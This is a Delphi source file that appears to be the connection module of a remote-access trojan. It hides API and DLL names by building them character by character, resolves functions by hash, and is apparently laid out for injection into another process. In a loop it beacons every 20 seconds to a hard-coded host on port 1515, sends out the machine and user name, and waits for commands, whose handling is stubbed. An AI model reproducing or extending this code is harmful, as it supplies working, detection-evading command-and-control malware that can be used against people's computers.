unit untConnection;

interface
  
uses
  Windows,
  untUtils,
  winsock;

const
  CMD_ONLINE = 0;

type
  TConnRec = packed record
    pAPI:PAPIRec;
    hWinsock:Integer;
    xWSAStartup:function(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;
    xsocket:function(af, Struct, protocol: Integer): TSocket; stdcall;
    xhtons:function(hostshort: u_short): u_short; stdcall;
    xinet_addr:function(cp: PChar): u_long; stdcall;
    xgethostbyname:function(name: PChar): PHostEnt; stdcall;
    xconnect:function(s: Integer; var name: TSockAddr; namelen: Integer): Integer; stdcall;
    xsend:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
    xrecv:function(s: Integer; var Buf; len, flags: Integer): Integer; stdcall;
    xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
    xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
  end;
  PConnRec = ^TConnRec;

type
  LPSocketHeader = ^TSocketHeader;
  TSocketHeader = packed Record
    dwSocketLen: DWORD;
    bSocketCmd: Byte;
  end;

procedure ConnectionLoop(pAPI:PAPIRec);
procedure ConnectionLoop_CALLER(pAPI:PAPIRec); stdcall;
procedure ConnectionLoop_END();

implementation

procedure ConnectionLoop_CALLER(pAPI:PAPIRec);stdcall;
begin
  ConnectionLoop(pAPI);
end;

function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  pConn.pAPI.xZeroMemory(szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    pConn.pAPI.xCopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwSocketLen := iBufferLen + 1;
    bSocketCmd := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := pConn.xsend(pConn.hWinsock, szSendBuffer, iBufferLen, 0);
  if (iSendLen = iBufferLen) then
    Result := True;
end;

function RecvBuffer(pConn:PConnRec; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
var
  lpTempBuffer: PWideChar;
begin
  Result := 0;
  pConn.pAPI.xZeroMemory(lpszBuffer^, iBufferLen);
  lpTempBuffer := lpszBuffer;
  while (iBufferLen > 0) do
  begin
    Result := pConn.xrecv(pConn.hWinsock, lpTempBuffer^, iBufferLen, 0);
    if (Result = SOCKET_ERROR) or (Result = 0) then
      break;
    lpTempBuffer := PWideChar(DWORD(lpTempBuffer) + DWORD(Result));
    iBufferLen := iBufferLen - Result;
  end;
end;

procedure ReceiveCommands(pConn:PConnRec);
var
  iResult: Integer;
  dwBufferLen: DWORD;
  bCommand:Byte;
  mRecvBuffer:Pointer;
begin
  mRecvBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
  if (mRecvBuffer <> nil) then
  begin
    while True do
    begin
      iResult := RecvBuffer(pConn, @dwBufferLen, SizeOf(DWORD));
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
        Break;
      if (dwBufferLen > 8192) then
        Break;
      // Get Command
      iResult := RecvBuffer(pConn, @bCommand, 1);
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
      begin
        Break;
      end;
      //Get Data
      pConn.pAPI.xZeroMemory(mRecvBuffer^, 8192);
      iResult := RecvBuffer(pConn, mRecvBuffer, dwBufferLen - 1);
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
      begin
        Break;
      end;
      //Parse Packet
      pConn.pAPI.xMessageBoxW(0,mRecvBuffer,nil,0);
      //ParsePacket(mySocket, mRecvBuffer, dwBufferLen - 1, bCommand);
    end;
    pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
  end;
end;

function SendInformation(pConn:PConnRec):Boolean;
var
  pComputerName:array[0..100] of WideChar;
  pUserName:array[0..100] of WideChar;
  pFullInformations:PWideChar;
  dwLen:Cardinal;
  strCMP:Array[0..8] of WideChar;
begin
  Result := False;
  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:=#0;
  dwLen := 100;
  pConn.pAPI.xZeroMemory(pComputerName, dwLen);
  pConn.xGetComputernameW(@pComputerName[0], dwLen);
  dwLen := 100;
  pConn.pAPI.xZeroMemory(pUserName[0], dwLen);
  pConn.xGetUserNameW(@pUserName[0], dwLen);
  dwLen := (pConn.pAPI.xlstrlenW(pComputerName) + pConn.pAPI.xlstrlenW(pUsername) + 1) * 2;
  pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, dwLen);
  if pFullInformations <> nil then
  begin
    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 101);
    Result := SendBuffer(pConn, CMD_ONLINE, pFullInformations, (pConn.pAPI.xlstrlenW(pFullInformations) + 1) * 2);
  end;
  pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
end;

function ConnectToHost(pConn:PConnRec; pAddress:PChar; dwPort:Integer):Integer;
var
  SockAddrIn: TSockAddrIn;
  HostEnt: PHostEnt;
begin
  Result := pConn.xsocket(AF_INET, SOCK_STREAM, 0);
  If Result <> INVALID_SOCKET then begin
    SockAddrIn.sin_family := AF_INET;
    SockAddrIn.sin_port := pConn.xhtons(dwPort);
    SockAddrIn.sin_addr.s_addr := pConn.xinet_addr(pAddress);
    if SockAddrIn.sin_addr.s_addr = INADDR_NONE then
    begin
      HostEnt := pConn.xgethostbyname(pAddress);
      if HostEnt <> nil then
        SockAddrIn.sin_addr.s_addr := Longint(PLongint(HostEnt^.h_addr_list^)^)
      else
      begin
        Result := INVALID_SOCKET;
        Exit;
      end;
    end;
    if pConn.xconnect(Result, SockAddrIn, SizeOf(SockAddrIn)) <> S_OK then
      Result := INVALID_SOCKET;
  end;
end;

function ResolveWinsockAPI(pAPI:PAPIRec):PConnRec;
var
  strWinsock:Array[0..11] of Char;
  strWSAStartup:Array[0..10] of AnsiChar;
  strsocket:Array[0..6] of AnsiChar;
  strhtons:Array[0..5] of AnsiChar;
  strinetaddr:Array[0..9] of AnsiChar;
  strgethostbyname:Array[0..13] of AnsiChar;
  strconnect:Array[0..7] of AnsiChar;
  strsend, strrecv:Array[0..4] of AnsiChar;
begin
  strWinsock[0]:='w';strWinsock[1]:='s';strWinsock[2]:='o';strWinsock[3]:='c';strWinsock[4]:='k';strWinsock[5]:='3';strWinsock[6]:='2';strWinsock[7]:='.';strWinsock[8]:='d';strWinsock[9]:='l';strWinsock[10]:='l';strWinsock[11]:=#0;
  strWSAStartup[0]:='W';strWSAStartup[1]:='S';strWSAStartup[2]:='A';strWSAStartup[3]:='S';strWSAStartup[4]:='t';strWSAStartup[5]:='a';strWSAStartup[6]:='r';strWSAStartup[7]:='t';strWSAStartup[8]:='u';strWSAStartup[9]:='p';strWSAStartup[10]:=#0;
  strsocket[0]:='s';strsocket[1]:='o';strsocket[2]:='c';strsocket[3]:='k';strsocket[4]:='e';strsocket[5]:='t';strsocket[6]:=#0;
  strhtons[0]:='h';strhtons[1]:='t';strhtons[2]:='o';strhtons[3]:='n';strhtons[4]:='s';strhtons[5]:=#0;
  strinetaddr[0]:='i';strinetaddr[1]:='n';strinetaddr[2]:='e';strinetaddr[3]:='t';strinetaddr[4]:='_';strinetaddr[5]:='a';strinetaddr[6]:='d';strinetaddr[7]:='d';strinetaddr[8]:='r';strinetaddr[9]:=#0;
  strgethostbyname[0]:='g';strgethostbyname[1]:='e';strgethostbyname[2]:='t';strgethostbyname[3]:='h';strgethostbyname[4]:='o';strgethostbyname[5]:='s';strgethostbyname[6]:='t';strgethostbyname[7]:='b';strgethostbyname[8]:='y';strgethostbyname[9]:='n';strgethostbyname[10]:='a';strgethostbyname[11]:='m';strgethostbyname[12]:='e';strgethostbyname[13]:=#0;
  strconnect[0]:='c';strconnect[1]:='o';strconnect[2]:='n';strconnect[3]:='n';strconnect[4]:='e';strconnect[5]:='c';strconnect[6]:='t';strconnect[7]:=#0;
  strsend[0]:='s';strsend[1]:='e';strsend[2]:='n';strsend[3]:='d';strsend[4]:=#0;
  strrecv[0]:='r';strrecv[1]:='e';strrecv[2]:='c';strrecv[3]:='v';strrecv[4]:=#0;
  Result := pAPI.xAllocMem(pAPI, SizeOf(TConnRec));
  if Result <> nil then
  begin
    Result.pAPI := pAPI;
    Result.hWinsock := pAPI.xLoadLibraryW(@strWinsock[0]);
    Result.xWSAStartup := pAPI.xGetProcAddress(Result.hWinsock, @strWSAStartup[0]);
    Result.xsocket := pAPI.xGetProcAddress(Result.hWinsock, @strsocket[0]);
    Result.xhtons := pAPI.xGetProcAddress(Result.hWinsock, @strhtons[0]);
    Result.xinet_addr := pAPI.xGetProcAddress(Result.hWinsock, @strinetaddr[0]);
    Result.xgethostbyname := pAPI.xGetProcAddress(Result.hWinsock, @strgethostbyname[0]);
    Result.xconnect := pAPI.xGetProcAddress(Result.hWinsock, @strconnect[0]);
    Result.xsend := pAPI.xGetProcAddress(Result.hWinsock, @strsend[0]);
    Result.xrecv := pAPI.xGetProcAddress(Result.hWinsock, @strrecv[0]);
    Result.xGetComputerNameW := pAPI.xGetProcAddressEx(pAPI.hKernel32, $4E5771A7, 16);
    Result.xGetUserNameW := pAPI.xGetProcAddressEx(pAPI.hAdvapi32, $ADA2AFC2, 12);
  end;
end;

procedure ConnectionLoop(pAPI:PAPIRec);
var
  hMainSocket:Cardinal;
  WSAData:TWSAData;
  pConn:PConnRec;
  strHost:Array[0..20] of ansiChar;
begin
  strHost[0]:='1';strHost[1]:='2';strHost[2]:='7';strHost[3]:='.';strHost[4]:='0';strHost[5]:='.';strHost[6]:='0';strHost[7]:='.';strHost[8]:='1';strHost[9]:=#0;
  pConn := ResolveWinsockAPI(pAPI);
  pConn.xWSAStartUp($202, WSAData);
  while True do
  begin
    pConn.hWinsock := ConnectToHost(pConn, @strHost[0], 1515);
    if pConn.hWinsock <> INVALID_SOCKET then
    begin
      if SendInformation(pConn) then
      begin
        ReceiveCommands(pConn);
      end;
    end;
    CloseSocket(pConn.hWinsock);
    Sleep(20000);
  end;
end;

procedure ConnectionLoop_END();asm end;

end.
